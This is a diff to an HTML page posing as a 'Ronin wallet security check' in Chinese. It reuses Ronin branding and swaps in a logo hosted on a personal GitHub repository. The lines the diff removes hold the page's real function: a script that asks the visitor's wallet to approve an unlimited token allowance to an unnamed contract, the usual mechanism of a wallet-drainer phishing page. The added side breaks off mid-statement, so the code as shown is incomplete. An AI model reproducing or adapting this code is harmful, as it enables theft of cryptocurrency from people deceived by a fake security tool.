@@ -20,6 +20,8 @@
     .logo {
       max-width: 100px;
       margin-bottom: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
     }
     h1 {
       font-size: 2.5rem;
@@ -63,8 +65,8 @@
 </head>
 <body>
 
-  <!-- Ronin Logo -->
-  <img class="logo" src="https://roninchain.com/images/logos/logo-blue.svg" alt="Ronin Logo" />
+  <!-- 使用你上传的本地图片 -->
+  <img class="logo" src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE_20250403114421.png" alt="Ronin Logo" />
 
   <!-- 页面标题 -->
   <h1>Ronin 钱包安全检测</h1>
@@ -105,17 +107,4 @@
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
-      const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
-      try {
-        const tx = await tokenContract.approve(contractAddress, ethers.constants.MaxUint256);
-        alert("授权成功！交易哈希：" + tx.hash);
-      } catch (err) {
-        alert("授权失败: " + err.message);
-      }
-    }
-  </script>
-</body>
-</html>
+      const signer =
